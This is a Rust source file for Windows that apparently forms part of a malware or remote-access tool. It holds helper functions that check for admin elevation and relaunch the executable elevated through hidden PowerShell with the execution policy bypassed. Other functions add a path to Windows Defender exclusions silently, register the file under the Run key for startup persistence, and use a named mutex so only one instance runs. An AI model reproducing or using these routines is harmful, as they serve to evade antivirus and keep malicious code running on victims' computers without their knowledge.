use std::ffi::OsStr;
use std::mem;
use std::os::windows::prelude::OsStrExt;
use std::os::windows::process::CommandExt;
use std::process::Stdio;
use std::{
    io::Error,
    process::{Command, ExitStatus},
    ptr::null_mut,
};
use winapi::shared::minwindef::DWORD;
use winapi::um::processthreadsapi::OpenProcessToken;
use winapi::um::securitybaseapi::GetTokenInformation;
use winapi::um::synchapi::{OpenMutexW, CreateMutexW};
use winapi::um::winbase::CREATE_NO_WINDOW;
use winapi::um::winnt::{TokenElevation, HANDLE, TOKEN_ELEVATION, TOKEN_QUERY, SYNCHRONIZE};

use crate::{FILE_NAME, MUTEX};

pub fn is_administrator() -> Result<bool, Error> {
    let token: HANDLE = null_mut();
    let process_handle = unsafe { winapi::um::processthreadsapi::GetCurrentProcess() };
    let success =
        unsafe { OpenProcessToken(process_handle, TOKEN_QUERY, &token as *const _ as *mut _) } != 0;

    if !success {
        return Err(Error::last_os_error());
    }

    let mut elevation: TOKEN_ELEVATION = unsafe { mem::zeroed() };
    let mut ret_len: DWORD = 0;

    let success = unsafe {
        GetTokenInformation(
            token,
            TokenElevation,
            &mut elevation as *mut _ as *mut _,
            mem::size_of::<TOKEN_ELEVATION>() as u32,
            &mut ret_len as *mut _,
        ) != 0
    };

    if !success {
        return Err(Error::last_os_error());
    }

    Ok(elevation.TokenIsElevated != 0)
}

pub fn run_as_admin() -> ExitStatus {
    let status = Command::new("powershell")
        .creation_flags(CREATE_NO_WINDOW)
        .args(&[
            "-ExecutionPolicy",
            "Bypass",
            "-NoProfile",
            "-Command",
            &format!(
                "Start-Process -FilePath \"{}\" -Verb RunAs",
                std::env::current_exe().unwrap().to_str().unwrap()
            ),
        ])
        .stdout(Stdio::piped())
        .status()
        .expect("Failed to execute command");

    status
}

pub fn add_to_defender_exclusions(path: &str) -> () {
    Command::new("powershell")
        .args(&[
            "-Command",
            &format!("Add-MpPreference -ExclusionPath '{}'", path),
        ])
        .creation_flags(CREATE_NO_WINDOW)
        .stdout(Stdio::piped())
        .spawn()
        .expect("Failed to execute command.");
}

pub fn add_to_startup_registry(path: String) -> std::io::Result<()> {
    use crate::registry;

    let key = registry::open_registry_key(r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run").unwrap();
    registry::set_registry_value(key, FILE_NAME, &path)?;

    Ok(())
}

pub fn check_mutex() -> bool {
    let mutex_name: Vec<u16> = OsStr::new(MUTEX)
        .encode_wide()
        .chain(Some(0).into_iter())
        .collect();

    let handle: HANDLE = unsafe { OpenMutexW(SYNCHRONIZE, 0, mutex_name.as_ptr()) };

    if handle.is_null() {
        let new_handle: HANDLE = unsafe { CreateMutexW(null_mut(), 0, mutex_name.as_ptr()) };

        if new_handle.is_null() {
            return false;
        }
    } else {
        return false;
    }

    true
}